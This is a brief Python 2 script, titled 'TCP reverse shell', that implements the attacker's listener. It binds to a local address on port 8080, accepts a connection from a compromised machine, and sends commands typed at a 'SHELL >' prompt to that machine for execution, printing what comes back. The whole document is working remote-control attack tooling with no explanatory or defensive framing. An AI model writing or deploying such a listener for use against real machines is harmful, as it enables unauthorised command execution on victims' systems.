#TCP reverse shell

#netstat -antp | grep 8080

import socket 
def connect():
    print"running."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("192.168.0.4",8080))
    s.listen(1)
    print "Listening on PORT 8080 . . "
    conn,addr=s.accept()
    print "SHELL HAS BEEN STARTED..",addr
    
    while True:
        command=raw_input("SHELL >")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print conn.recv(1024)

def main():
  connect()
main()
  
  
  
